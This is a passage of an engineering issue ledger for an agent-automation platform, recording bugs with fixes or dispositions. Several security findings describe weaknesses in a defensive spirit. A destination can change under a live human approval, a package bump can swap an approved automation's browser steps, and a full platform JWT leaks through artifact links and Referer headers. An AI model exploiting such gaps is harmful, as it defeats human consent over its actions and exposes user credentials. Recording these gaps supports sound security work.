  (b) AND THE DESTINATION CAN MOVE UNDER A LIVE APPROVAL. `actionShape` fingerprints
  `(key, actionName, backing, transport, httpConfig, automationBinding)` - the TEMPLATE. Config
  VALUES are not in it. Reproduced: a human granted "Autorizar sempre" for the write; the config's
  `ntfy_topic` was then changed with `PATCH /api/v1/integrations/configs/ntfy` and NOTHING else;
  the same gateway key's next `achieve` call published to the NEW topic, HTTP 200, message
  confirmed landed on a destination the approver never saw. No re-prompt, because by the
  fingerprint nothing changed.
  SCOPE, honestly: the host cannot be moved this way - `baseUrl` is literal in the action and
  origin-binding would refuse a new host - so this redirects WITHIN an already-bound origin
  (path/query/body). And the principal who can edit the config is the credential owner, so this is
  not a peer-to-peer escalation. What it does break is the meaning of the consent record: "I
  authorised sending to X" silently becomes "sending to Y", which is exactly what the approval
  exists to pin. It also matters more after D3, since `achieve` makes the write rail reachable by a
  key whose holder is not the approver.
  CANDIDATE CLOSES (not attempted here): render the RESOLVED target in the dialog for non-secret
  config values and mark secret ones, or extend the fingerprint to cover the config values the
  template actually names, so moving one invalidates the approval the way editing the action does.
- **`authored-action-guardrails-cannot-prove-an-endpoint-exists`** (OPEN 2026-08-04, LOW, honest
  labelling - observed while validating D3's author arm against a REAL API with a real model).
  `achieve` was asked for "consultar as estatisticas do topico" on a live ntfy.sh integration. It
  authored `consultar_estatisticas_topico` -> `GET https://ntfy.sh/<topic>/stats`, and ALL EIGHT
  deterministic guardrails passed: shape, action_name, backing, transport, origin, placeholders,
  no_pasted_secret, render. The action was well-formed, on a bound host, naming only declared
  variables. It is also wrong: ntfy has no `/stats` endpoint, and once a human promoted it the call
  returned a real 404.
  NOT A DEFECT IN THE SUITE, and recorded so nobody reads a passing verification as more than it
  claims: every check is a property of the DRAFT, and none of them can know a remote API's route
  table without calling it - which the author arm must not do, since the call it would make is
  exactly the unapproved one. This is the argument FOR provisional-by-default rather than against
  it: the state machine exists because a draft can be perfectly formed and still not work, and the
  human promoting it is the first party in a position to notice.
  CANDIDATE CLOSE if it ever matters: surface the verification verdict in the promotion dialog
  alongside a one-click dry run of the drafted action, so the person promoting sees the real
  response before they take responsibility for it.
- **`action-shape-does-not-cover-browser-steps-content`** (OPEN 2026-08-03, HIGH, consent bound to a
  name rather than to a command). `actionShape` (integrations/action-consent.ts) hashes
  `automationBinding` - i.e. the automation's ID - and never the STEPS that automation runs.
  `provisionIntegrationAutomations` re-provisions the SAME deterministic org-scoped id from a
  refreshed template and rewrites `steps` in place, so a package bump changes WHAT EXECUTES while
  the human's approval still stands. That is exactly the "consent never approved the command called
  deploy" failure the module's own docblock invokes: it holds for `httpConfig`, and not for the
  automation backing. `bash-cli` is saved by the engine's separate `approved_commands` gate and, as
  of this slice, an `api_call` step inside a provisioned automation is gated too - so the residual is
  a swapped `browser`/`navigate`/`verify` sequence, which is precisely what a `browser-steps` action
  is made of. NOT FIXED HERE because the fix belongs in `action-consent.ts`, C2's file and read-only
  for this slice. THE FIX, precisely: make the bound automation's CONTENT part of the fingerprint -
  either hash the provisioned automation's canonical `steps` into `actionShape`'s tuple alongside
  `automationBinding` (needs the steps at gate time, i.e. a resolver the executor can call), or have
  the provisioner stamp a content digest onto `automationBinding` (`actionShape` already hashes the
  whole binding object, so the shape would follow with no change to the hash function at all). The
  second is additive and cheaper; both make a package bump re-prompt, which is the correct direction.

- **`no-wire-event-can-carry-a-pause-reason`** (OPEN 2026-08-03, LOW, honest labelling). A run that
  halts because an integration WRITE needs approval persists `status: 'awaiting_consent'` (correct,
  and what the run resource and Histórico show), but has no truthful terminal SSE frame: `paused`
  carries only `{ service }` (`shared/src/events.ts`) and the dashboard maps it to
  `awaiting_integration`, i.e. it would tell someone whose integration is connected and working to go
  connect it; `awaiting_consent` carries `{ stepIndex, shape, argv, description }`, a COMMAND
  consent whose "sempre" the dashboard answers into a store this gate does not read. The engine
  therefore emits `error` with the message that names the action, the destination and the fact that
  an approval is needed - true and actionable, at the cost of a live badge that reads "failed" while
  the record reads `awaiting_consent`. THE FIX: `paused` gains an optional `reason` (additive under
  Rule 7), the dashboard renders `awaiting_consent` distinctly and links to the integration's
  action-approvals surface. Not done here: `shared/` is slice D1's live surface this wave.

- **`module-level-regex-from-an-imported-const-silently-misbuilds-in-the-integrations-cycle`**
  (OPEN 2026-08-03, HIGH latent, correctness - found by slice E2 while building `publish-scrub.ts`).
  `api/src/integrations/` contains a live import cycle: `definitions -> service -> credential-cofre
  -> definition-registry -> publish-scrub -> definitions`. Inside a cycle, a module-level
  `new RegExp(SOME_IMPORTED_CONST)` evaluates while the imported binding is still in its temporal
  dead zone / undefined, so the pattern is built from the WRONG source and compiles silently. E2 hit
  this for real: the placeholder branch of its credential pattern never matched, which made the
  publish floor redact EVERY SHIPPED AUTH HEADER — i.e. published integrations would have gone out
  with `[REDACTED]` where their `Authorization` template belonged. It failed silently at every level
  except one: the shipped-package identity property test (the A3 determinism ratchet) was the only
  thing that caught it. Fixed in E2 by building the regex LAZILY. THE FINDING IS NOT E2's BUG - it is
  that the hazard is invisible and repeatable: any future module-level use of an imported binding
  anywhere in that cycle can misbuild the same way. Close by breaking the cycle, or by a lint rule
  banning module-level `new RegExp(<imported>)` in `api/src/integrations/**`. Logged by the
  orchestrator because E2 correctly reported it rather than editing a file outside its ownership.

- **`send-to-pairing-returning-true-is-not-delivery`** (OPEN 2026-08-07, MEDIUM, honest signalling
  - found while verifying the attended ceremony live against a MacBook Air over a DERP relay).
  `sendToPairing` resolves to "the frame was written to a live socket", and `requestAttendedCeremony`
  treats that as the ceremony having started: it records the pending ceremony and the route answers
  `started: true` / `waiting_login`, i.e. "a browser is opening on your machine". Observed for real:
  a `POST /integrations/citius/session` returned `started: true`, the daemon's own log shows the
  socket went `reconnecting` -> `open` moments later, and the frame appears NOWHERE in that log. The
  write succeeded into a socket that died before delivery; the ceremony then sat open for its full
  10-minute TTL and expired. A second POST on a stable link was delivered and ran correctly, so this
  is transport churn, not the protocol gap fixed in `6186418`.
  This is the SAME SHAPE as that bug one layer down: a success value that is true about this
  process's action and silent about the outcome the user was promised. It matters more on a laptop
  over a relay (sleep/wake, DERP) than on a wired peer, which is exactly where the card readers are.
  THE FIX: the ceremony needs an ack. The daemon already knows when it has accepted an
  `attended.request` (it logs and opens the browser), so an `attended.ack { requestId }` frame is
  additive under Rule 7, and `requestAttendedCeremony` should hold the ceremony as `pending` until
  it arrives, with a short timeout that reports honestly rather than a `started: true` that outlives
  the socket. Re-delivery on reconnect is the larger version and is NOT proposed here: a ceremony
  needs a human at the machine now, so replaying one minutes later asks at a moment nobody is
  standing there (`bridge/attended.ts` already refuses queueing for that reason).

- **`artifact-card-link-carries-the-platform-jwt`** (OPEN 2026-08-15, HIGH, security - found by
  the 2026-08-15 model code review of the uncommitted working tree; belongs to the artifact-URL
  session, recorded here so the migration does not land on top of it silently). The artifacts
  surface (`web/components/artifacts/artifacts-surface.tsx` `getArtifactAppUrl`) appends the
  owner's FULL platform JWT as `?token=` to every non-shareable artifact's card link - a visible,
  copyable anchor, no longer confined to the sandboxed preview iframe (whose own comment
  explicitly avoided this: "skip the ?token= append so we don't leak the JWT into browser
  history / referrers"). "Copy link address" or forwarding the URL hands the recipient a reusable
  platform JWT valid against any API endpoint. COMPOUNDED BY the same tree's Referrer-Policy
  relaxation on `/apps` documents (`api/src/security-headers.ts` no-referrer -> same-origin):
  with the JWT in the document URL, every same-origin subresource and `/api/*` call carries
  `Referer: ...?token=<JWT>` - and `design-tokens.ts` reads `req.headers.referer`, so the JWT
  lands verbatim in logs. The `serving.ts` 302 token-strip covers only purpose-scoped preview
  tokens, so the JWT stays in the document URL. FIX DIRECTION (needs the feature author's
  intent): mint the existing purpose-scoped, server-stripped preview token for the card link
  instead of the raw JWT, and restore `no-referrer` (the design-tokens Referer dependency then
  needs its app identity from a query/header instead). NOT fixed in the migration run: it is the
  in-flight feature of another session; reworking its auth model blind risks breaking intent.
  The salomao ERP will serve on this exact surface, so this blocks the customer cutover.

- **`review-findings-2026-08-15-carryover`** (OPEN 2026-08-15, MEDIUM, ledgered so the review's
  remaining confirmed findings are closed deliberately, never silently). From the same
  code review of the uncommitted tree, all in the previous session's work: (a)
  `resolveBrandCanvas` (`api/src/services/design-tokens.ts`) picks the canvas by raw swatch
  count among luminance extremes, so a dark brand whose white TEXT swatches dominate is
  classified LIGHT - it fails on the committed `scripts/seed/branding.json` fixture itself
  (#ffffff count=162 from text/buttons vs #080c14 count=7, instructions say "Ambiente escuro");
  weight by source class (background-ish sources over text-ish) or honour the instructions
  field. (b) `usedCitations` (`api/src/apps/app-assistant.ts`) filters citations by `[n]`
  markers in the prose but the panel renders an UNNUMBERED Fontes list: markers dangle,
  `[1, 2]` multi-ref form does not match, a paraphrased unmarked reply silently loses ALL
  citations, and bracketed indexes in code snippets false-match. (c) chat-kind grounding
  (`api/src/knowledge/grounding.ts`) gates the shared legal corpus on a finite keyword list -
  legal questions without a listed keyword ("divórcio", "herança" are absent) silently lose
  the corpus with no few-hits fallback. (d) `listenerStamp` (`api/src/events/service.ts`,
  migration S2): platform triggers created in an org with NO platform connection poll forever
  on a 300s-capped backoff (no auto-disable), and any platform-provider trigger row created
  BEFORE the inference stays webhook-kind and silently dead - acceptable pre-cutover (no such
  fleet exists), but a boot-time reconcile or a create-time connection check should land before
  triggers are exposed to customers. Each item ends FIXED or NOT-NEEDED with a reason; none
  may be dropped by inertia.

- **`salomao-vision-pass-2026-08-15`** (LEDGERED 2026-08-15, discovery layer - the fine-comb
  vision pass over the freshly imported `legal-case-manager-3` instance on the dev stack: 8
  browser lanes, every module + public surfaces + mobile spot-check, screenshots read and
  judged; evidence under the session scratchpad `vision/` dirs, full per-lane reports in the
  `salomao-erp-vision-pass` workflow output). Per the QA process every item below ends in a
  deterministic test or a written dismissal - dispositions stated now, none silently dropped.
  The migration itself came out CLEAN: all 1,627 rows render with real content and zero
  mojibake, the 91 migrated documents open (blob+sidecar plane proven end-user-visible), the
  M365-degrade is mostly graceful (Captacao shows an honest retry card), and dashboard numbers
  reconcile with the REST plane. The pass found APP-level defects (present on prod today, not
  migration regressions) plus data-hygiene items:
  FIX-IN-FLIGHT (same-day fix wave, each verified in-browser + spec'd): (1) BLOCKER - client
  Documentos delete is one unconfirmed click, irreversibly destroying the blob (a real
  document was destroyed by the QA lane's misclick and fully restored - row re-created, blob
  re-copied via the idempotent `migrate-app-files.mjs` re-run, serving 200 again; the incident
  is itself the proof of the restore path). In-app confirm dialog + separated affordances.
  (2) HIGH - pt-PT money misparse in aggregates: digit-stripping turns '100.000,00' into 10
  million; Relatorios VALOR EM PIPELINE showed EUR 10 041 350 where the true sum is ~141k,
  Funil column totals inflated ~100x. One shared parser + one pt-PT formatter. (3) HIGH -
  React duplicate-key errors: Clientes/Auditoria lists keyed by non-unique business codes
  (real data holds duplicate client codes and a millisecond-collision LOG code); key by
  record id. (4) HIGH - login screen does not reflow at 390px (form clipped past the
  viewport, container overflow:hidden).
  OPEN-APP (recorded for the app's next iteration with the customer; each needs a fix + spec
  or a customer sign-off dismissal): Revisao de KYC renders the same hardcoded checklist for
  every dossier, ignoring per-submission state (HIGH - compliance screen); 'Enviar ao
  cliente' under a missing M365 credential top-level-navigates the SPA into a bare error page
  (HIGH - degrade UX); proposal Estado vocabulary drift ('Proposta enviada'/'Aprovada'
  invisible to filter + Relatorios counts); list VALOR never recomputed from items (18x off
  on a real signed-in-progress proposal); Clientes list badges contradict detail pages
  (denormalized counts); Projetos progress ignores atividade_status overrides; client
  'Atividade' tab shows a canned identical timeline; Distribuicao chart renders 0px tall on
  Dashboard de Atividades; Auditoria renders raw user tokens/UUIDs for ~30% of rows; unknown
  hash routes silently render the Dashboard; funnel 'Ganho' column permanently 0; KYC tab
  state contradictions; risk band never surfaced in review; Master approve/nao-aprova
  inconsistency; internal build-slice jargon (S12/S13/S14) visible in customer-facing UI;
  date/CSV/locale nits; sticky Zoho bar overlap; a11y names on Construtor buttons.
  OPEN-DATA-HYGIENE (operator + customer decisions at cutover; the prod dump carries all of
  it - verified pre-existing upstream, NOT introduced by the import, row counts match the
  dump exactly): duplicated client codes (BSM-2026-0001 x3 + 5 exact duplicate pairs), junk
  row 'dfdffddggdhd' in atividades, test/probe accounts holding Master role (Probe, Teste
  Ekoa, Bazinga Da Costa, CRM Master), SharePoint integration pointed at the throwaway
  bazingadas.sharepoint.com tenant instead of the customer's, platform-e2e residue rows,
  LOG-code generator collisions, PT-BR/PT-PT spelling drift in template content. These go on
  the cutover runbook's pre-flight checklist as a customer-blessed cleanup, never a silent
  edit.
  ENV-NOTED (no action): PWA manifest absent (tracked parity row - installed-PWA users lose
  their entry until ported); Zoho not connected on dev (send refusal correct); model
  credential works (AI features live).

- **`bridge-pdfjs-major-declares-node-22-while-the-package-pins-node-20`** (OPEN 2026-08-18, MEDIUM,
  latent runtime - found while moving the daemon into `clients/bridge`, pre-existing in its own
  repository). `clients/bridge` depends on `pdfjs-dist ^6.1.200`, which resolves to a build whose
  own `engines` field declares `node >=22.13.0 || >=24`. The package is pinned to Node 20
  (`.nvmrc`, `engines: >=20 <21`), so `npm i -g` of the shipped tarball prints an EBADENGINE warning
  and installs anyway - npm does not enforce engines by default. Nothing in the suite catches it:
  the PDF path (`src/tools/extract-text.ts`, `await import('pdfjs-dist/legacy/build/pdf.mjs')`) is
  exercised only where the legacy build happens to work on Node 20 today, so the failure mode is a
  future pdfjs patch using a Node 22 API and breaking text extraction on operators' laptops with no
  gate having gone red. Compounding it, `api/` pins `pdfjs-dist ^4.10.38`, so the monorepo now
  carries TWO pdfjs copies (the bridge's nests under `clients/bridge/node_modules`). Disposition:
  NOT fixed in the move - aligning them means either downgrading the daemon's extraction to v4 or
  bumping api's to v6, and neither is a move. The real fix is one range across both workspaces,
  chosen against a Node-20 runtime, with the extraction path pinned by a test that actually reads a
  PDF on the pinned Node version.

- **`capability-grants-have-no-production-caller-so-every-daemon-step-is-refused`** (OPEN 2026-08-19,
  HIGH, product-blocking - found while fixing the credential-before-grant ordering in
  `bridge/daemon-step-seam.ts`). `bridge/capability-grants.ts` is default-deny (I-3) by design, and
  `grantCapability`, `revokeCapability`, `grantedCapabilities` and `usableCapabilities` have ZERO
  callers outside `api/tests/` - no route, no service, no admin surface, nothing in `web/`. Verified
  by grep across `api/src`, `web/` and `shared/src`. The consequence is total rather than partial:
  with the grant now read before delivery, EVERY daemon-executed step - browser and bash, with or
  without `envRefs` - is refused, because no org can express a grant. Before this change the same
  fact was masked, in the worst way: an `envRefs`-bearing step decrypted a Cofre item and shipped
  the plaintext to the machine before hitting the same refusal, so the path looked partly alive.
  NOT FIXED HERE, deliberately: an admin surface for granting a capability on a machine is a
  product decision (who may grant, per-org vs per-owner, what the UI says, whether granting is
  audited through `bridge/audit.ts`) and inventing one inside a security fix would ship an
  authorisation surface nobody reviewed. What this change does guarantee is that the failure is now
  a clean refusal with `retryable: false` rather than a credential disclosure followed by a refusal.
  The fix is a versioned, audited grant/revoke endpoint plus the machine-detail UI that calls it,
  with an isolation suite of the class of `api/tests/security/capability-grants.test.ts` proving a
  grant made in one tenant is unreadable in another.

- **`bridge-ingress-name-leg-reformats-json-stdout`** (OPEN 2026-08-19, LOW, cosmetic - noted while
  extending ingress redaction to the `tool.result` observation object). `redactStream`'s
  name-pattern leg (`redactBodyByName`) re-serialises any string that parses as JSON with
  `JSON.stringify(..., null, 2)`. That behaviour predates this change and already applied to
  `delegation_result.answer` and to a string-valued `tool.result.output`; extending the walk to the
  observation object means a bash step whose stdout is compact JSON now has that stdout
  pretty-printed in the persisted step record. NOT a correctness or security problem - the bytes
  are equivalent JSON and nothing joins on them - but it is a visible difference in recorded output
  and it is recorded here rather than discovered later as a mystery. The narrow fix is to re-emit
  the parsed tree with the ORIGINAL separators when nothing was actually masked; the broad one is to
  make the name leg return the input unchanged when it made no substitution. Neither belongs in a
  security fix, and both need a test that pins byte-identical passthrough for untouched output.
- **`no-queue-timeout-for-a-second-run-on-one-browser-profile`** (OPEN 2026-08-19, LOW, throughput -
  introduced by the run-scoped browser lease, deliberately). `ProfileManager.acquire` serialises per
  `profileId`, and with the lease now held for a whole RUN rather than a single `tool.invoke`, a
  second run targeting the same profile waits for the first to finish instead of interleaving with
  it. That is the correct semantics - one browser, one cookie jar, one Chromium singleton, and the
  interleaving it replaces was two runs corrupting each other's page - but the wait is UNBOUNDED
  except by the run-idle backstop (2 min after the first run's last step). A first run that keeps
  stepping for an hour blocks the second for an hour, and the second run has no way to say "I gave
  up": it simply sits in `acquire` until its own hosted invocation timeout fires, at which point
  Cortex reports "the machine did not answer in time" - which is true but names the wrong cause.
  Disposition: NOT fixed here. The right fix is a bounded wait in `withRunLease` that fails the step
  with a named "another run is using this profile" error, and it needs a decision about the bound
  (whether it should exceed Cortex's invocation timeout so the honest message wins the race, or sit
  under it) plus a wire-visible error the run UI can render. Out of scope for the lease fix, and
  today it is reachable only for two concurrent automations sharing one integration profile.

- **`daemon-run-lease-has-no-live-headed-chrome-verification`** (OPEN 2026-08-19, MEDIUM, coverage -
  a standing gap, not a regression). Every assertion about the run-scoped lease, the `release` verb,
  the idle backstop, the dangling-symlink `SingletonLock` recovery and the close-before-relaunch
  ordering runs against the INJECTED launcher and structural page/context fakes. That is the same
  discipline the profile suite already documents - the real launch is HEADED and cannot run on a box
  with no display, and this box has none - so the following remain unverified against a real browser:
  (a) that Chrome's actual `SingletonLock` on this platform is the dangling symlink the recovery now
  handles (the test builds one by hand from the documented shape, it does not observe one);
  (b) that a real `BrowserContext` survives being held across a multi-minute run without Playwright
  reaping the page; (c) that `clearCookies()` on a real PERSISTENT context removes the on-disk jar
  rather than only the in-memory one - which is what the run-end session guarantee rests on;
  (d) end-to-end, that a real navigate-then-click on a real site now lands on the same page; and
  (e) that the 45s keepalive against the 2-minute idle window holds a REAL run open across a
  `pause_for_user` CAPTCHA solve - the case the keepalive exists for, and the one where being wrong
  closes the browser in front of the person using it. Closing this needs the live-verification pass
  on a machine with a display, per the playbook in `docs/testing.md`; it is not closable from CI and
  is not claimed to be.

- **`suite-ledger-unit-census-red-on-main-59-registered-64-on-disk`** (OPEN 2026-08-19, MEDIUM, gate -
  PRE-EXISTING, not introduced here, and deliberately not fixed here). `npm run gate:ledger` fails
  its census: `frontend unit files on disk: 64 (ledger: 59)`. The spec census (83/83) and driver
  census (29/29) are clean; only the frontend-unit band has drifted. Five `web/__tests__/` files were
  added without the ledger entry the census requires, which is exactly the omission the census exists
  to catch, so the gate is doing its job. Attribution: this branch touches neither `web/` nor
  `api/tests/SUITE_LEDGER.json`, so the count is byte-identical to main; the unregistered names in
  the DUE list (`schedules-store`, `schedules-recurrence-text`, `chat-runtime`,
  `chat-panel-composer`, `chat-error-retry`, `chat-stripes-featured`, `lib/file-picker`,
  `lib/artifact-app-url`, `components/sync-outcome-panel`, ...) belong to the web/chat/schedules
  streams. Disposition: NOT fixed from this branch. Registering them means choosing a gate band per
  spec, which is a judgement the owning stream has to make, and editing `SUITE_LEDGER.json` while
  those streams are in flight would collide with them. It needs to be closed by whoever owns those
  specs, before the per-PR lane can be green.

- **`engine-finally-comment-still-says-the-daemon-session-dispose-is-a-no-op`** (FIXED 2026-08-19,
  LOW, stale comment). `api/src/automation/engine.ts`'s run `finally` read "The daemon session is a
  no-op (the daemon owns the page lifecycle)", which was true before the run-scoped lease and false
  after it. The follow-up pass rewrote that `finally` anyway - it is now where the call tree's
  browser lease is released (`releaseBrowserLease`, once, by the pass that minted the lease) - so
  the comment was replaced with what actually happens, including why each of the two conditions on
  the release is load-bearing. Pinned by `api/tests/automation/engine-sub-automation-lease.test.ts`.

- **`daemon-pidfile-is-released-before-the-browsers-have-finished-closing`** (FIXED 2026-08-19,
  LOW, race). `serve`'s shutdown called `removeDaemonPid(home)` before the browser teardown had
  completed. The pidfile is the CROSS-PROCESS lock on the profile directory - `profile.ts`'s header
  rests its "an in-process mutex is sufficient" argument on it - so for the duration of the teardown
  a second `serve` on the same home was allowed to start and could launch Chromium against a
  `userDataDir` the dying daemon had not released: the SingletonLock collision the lock exists to
  prevent. It was recorded rather than fixed because "the ordering lives inside `serve()`'s
  signal-handler closure and cannot be asserted without extracting the whole shutdown sequence into
  a named unit". The adversarial review of the lease change forced exactly that extraction
  (`installShutdown`, so the SIGINT/SIGTERM wiring is testable at all), which made the fix cheap:
  the pidfile now comes off AFTER `teardownBrowsers` resolves - or after its 10s deadline passes,
  because past that point holding it would only prevent a restart. Pinned by
  `test/cli/serve-teardown.test.ts` ("holds the pidfile until the profiles are actually free", plus
  the timeout case).

- **`api-suite-exits-1-on-chokidar-EMFILE-while-every-test-passes`** (OPEN 2026-08-19, HIGH, gate -
  PRE-EXISTING and flaky, not introduced here). `npm test` fails at the `@ekoa/api` workspace with
  `npm error code 1` while reporting `374 passed | 2 skipped` and ZERO failed tests. The exit code
  comes from vitest's UNHANDLED-ERROR channel: a burst of
  `Error: EMFILE: too many open files, watch '/tmp/ekoa-fam-sbx-*/user-*/id_*/manifest.json'`,
  raised by the chokidar watcher `api/src/apps/app-registry.ts` `startWatcher` opens per registered
  app (`manifest.json` + the dist dir). It surfaces through `tests/contract/artifact-family.test.ts`,
  which registers many apps; that test passes 32/32 when run ALONE, so the exhaustion is the whole
  374-file suite's parallel workers sharing this box's inotify budget
  (`fs.inotify.max_user_instances = 128`), not one test misbehaving.
  ATTRIBUTION, measured rather than assumed: the error COUNT is unstable across identical runs (20,
  then 19, then 126), and a full api run with this branch's only new api test file REMOVED still
  exits 1 with 126 errors and 252 EMFILE lines - i.e. it is worse without the change than with it.
  This branch touches no file in `api/src/apps/`. Two candidate fixes, neither attempted here: raise
  `fs.inotify.max_user_instances` on the runner (masks it), or have the app registry not hold a
  persistent watcher per app in a test process - the watcher exists for dev-serve rebuilds and has
  no purpose under a contract suite, so gating `startWatcher` on the dev-serve path is the real fix.
  Until then `npm test` cannot be green on this box, and every agent reporting a green run should be
  read as "all tests passed, the process still exited 1".

- **`daemon-lease-keepalive-costs-one-frame-and-one-ledger-row-per-45s-of-live-run`** (ACCEPTED
  2026-08-19, LOW, cost - introduced deliberately by the run-scoped lease). Every live browser lease
  is heartbeated by `DaemonBrowserSession` every 45 seconds, and each heartbeat is a signed
  `tool.invoke` that the daemon ledgers (an fsync'd append). A run paused for a human at a CAPTCHA
  for an hour writes ~80 rows. ACCEPTED rather than optimised, for two reasons. The alternative to a
  heartbeat is an idle window long enough to cover a human's think time, which is the same as no
  containment on an authenticated jar - the window is a security control, and a keepalive is what
  lets it stay at two minutes. And the rows are not noise: they are the audit record of how long
  this machine held an authenticated browser session open for a given run, which is exactly the kind
  of fact the ledger exists to hold. Revisit only if a real profile shows the fsync cost mattering.

- **`no-fence-between-a-late-release-and-a-resumed-run`** (OPEN 2026-08-19, LOW, race - narrow, and
  mitigated by design rather than closed). A run that halts on `needs_credentials` writes that state
  to the store BEFORE its `finally` runs, and the server-side observer can dispatch the resume from
  another leg the moment a credential is unlocked. So there is a window - the width of the engine's
  unwind - in which the resumed pass could take its lease before the halted pass's release lands.
  The lease id is what keeps this harmless in practice: it is minted PER PASS, so the late release
  names the OLD lease and cannot touch the resumed one; the worst outcome is the old lease being
  released twice (idempotent) or the resumed pass briefly queueing behind it on the profile mutex.
  A per-run key would have made this window fatal instead (the tombstone would refuse the resumed
  pass), which is one of the two reasons the key is per-pass. NOT closed: closing it properly means
  a fencing token on the wire, and there is no observed failure to justify one.
